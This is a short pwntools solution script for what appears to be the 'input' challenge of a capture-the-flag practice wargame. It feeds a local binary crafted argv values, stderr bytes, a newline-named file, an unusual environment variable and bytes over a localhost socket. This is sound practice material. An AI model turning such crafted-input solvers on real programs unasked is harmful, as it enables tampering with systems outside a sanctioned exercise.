#!/usr/bin/env python

from pwn import *

BIN_PATH = "/home/bobgil/Desktop/ctf-practice/pkr/07-input/input"
ARGS = [str(i) for i in range(100)]

ARGS[ord('A')] = "\x00".strip("\x00")
ARGS[ord('B')] = "\x20\x0a\x0d".rstrip("\x00")
ARGS[ord('C')] = str(9090) # Port Number


with open("./stderr", "w") as stderr:
	stderr.write("\x00\x0a\x02\xff")

with open("./\x0a", "w") as stage4:
	stage4.write("\x00\x00\x00\x00")

proc = process(argv=ARGS, executable=BIN_PATH, stderr=open("./stderr", "r"), env={"\xde\xad\xbe\xef": "\xca\xfe\xba\xbe"})


print proc.recvuntil("1 clear!"),

proc.sendline("\x00\x0a\x00\xff")

print proc.recvuntil("2 clear!"), 
print proc.recvuntil("3 clear!"), 
print proc.recvuntil("4 clear!"), 

sock = remote("127.0.0.1", 9090)
sock.send("\xde\xad\xbe\xef")

print proc.recvuntil("5 clear!"), 

sock.close()

proc.interactive()